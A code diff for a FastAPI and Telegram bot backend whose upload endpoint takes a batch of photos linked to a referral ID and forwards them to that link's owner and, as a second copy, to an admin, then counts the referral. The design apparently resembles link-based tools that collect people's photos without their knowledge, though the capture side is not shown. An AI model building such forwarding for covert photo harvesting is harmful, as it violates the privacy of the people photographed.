@@ -164,6 +164,10 @@ import os
 import json
 from pathlib import Path
 
+from typing import List
+from fastapi import FastAPI, Query, Request, UploadFile, File, Form
+from aiogram.types import BufferedInputFile, InputMediaPhoto
+
 from fastapi import FastAPI, Query, Request, UploadFile, File, Form
 from fastapi.responses import HTMLResponse
 from fastapi.templating import Jinja2Templates
@@ -245,11 +249,10 @@ async def home(
 
 @app.post("/upload-photo")
 async def upload_photo(
-    photo: UploadFile = File(...),
+    photos: List[UploadFile] = File(...),  # تغيير الاسم إلى photos ووضعه كـ List
     referral_id: str = Form(...)
 ):
     users_data = load_users()
-
     user = users_data["users"].get(referral_id)
 
     if not user:
@@ -258,27 +261,19 @@ async def upload_photo(
             "message": "رابط الإحالة غير صالح."
         }
 
-    image_bytes = await photo.read()
-
-    if not image_bytes:
+    if not photos:
         return {
             "success": False,
-            "message": "الصورة فارغة."
+            "message": "لم يتم إرسال أي صور."
         }
 
     owner_id = int(referral_id)
-
     username = user.get("username", "")
     name = user.get("name", "غير معروف")
-
-    username_text = (
-        f"@{username}"
-        if username
-        else "بدون username"
-    )
+    username_text = f"@{username}" if username else "بدون username"
 
     caption = (
-        "📸 صورة جديدة\n\n"
+        "📸 صور جديدة (5 صور)\n\n"
         f"👤 صاحب الرابط: {name}\n"
         f"🔹 Username: {username_text}\n"
         f"🆔 Telegram ID: {owner_id}\n"
@@ -286,37 +281,46 @@ async def upload_photo(
     )
 
     try:
-        # إرسال الصورة إلى صاحب الرابط
-        owner_photo = BufferedInputFile(
-            image_bytes,
-            filename="photo.jpg"
-        )
+        # إعداد مجموعة الصور لإرسالها كـ Album في تلجرام
+        media_group_owner = []
+        media_group_admin = []
 
-        await bot.send_photo(
-            chat_id=owner_id,
-            photo=owner_photo,
-            caption=caption
-        )
+        for idx, photo in enumerate(photos):
+            image_bytes = await photo.read()
+            if not image_bytes:
+                continue
 
-        # إرسال نسخة أخرى إلى المسؤول
-        admin_photo = BufferedInputFile(
-            image_bytes,
-            filename="photo.jpg"
-        )
+            # يضاف الوصف (Caption) على الصورة الأولى فقط في الألبوم
+            current_caption = caption if idx == 0 else ""
 
-        await bot.send_photo(
-            chat_id=ADMIN_TELEGRAM_ID,
-            photo=admin_photo,
-            caption=caption
-        )
+            media_group_owner.append(
+                InputMediaPhoto(
+                    media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg"),
+                    caption=current_caption
+                )
+            )
+
+            media_group_admin.append(
+                InputMediaPhoto(
+                    media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg"),
+                    caption=current_caption
+                )
+            )
+
+        if media_group_owner:
+            # إرسال ألبوم الصور إلى صاحب الرابط
+            await bot.send_media_group(chat_id=owner_id, media=media_group_owner)
+
+            # إرسال ألبوم الصور إلى المسؤول
+            await bot.send_media_group(chat_id=ADMIN_TELEGRAM_ID, media=media_group_admin)
 
     except Exception as error:
-        print("ERROR SENDING PHOTO TO TELEGRAM:")
+        print("ERROR SENDING PHOTOS TO TELEGRAM:")
         print(repr(error))
 
         return {
             "success": False,
-            "message": "فشل إرسال الصورة إلى Telegram."
+            "message": "فشل إرسال الصور إلى Telegram."
         }
 
     # زيادة عدد الإحالات بعد نجاح الإرسال
@@ -332,12 +336,5 @@ async def upload_photo(
 
     return {
         "success": True,
-        "message": "تم إرسال الصورة بنجاح."
-    }
-
-
-@app.get("/health")
-async def health():
-    return {
-        "status": "ok"
+        "message": "تم إرسال الصور بنجاح."
     }
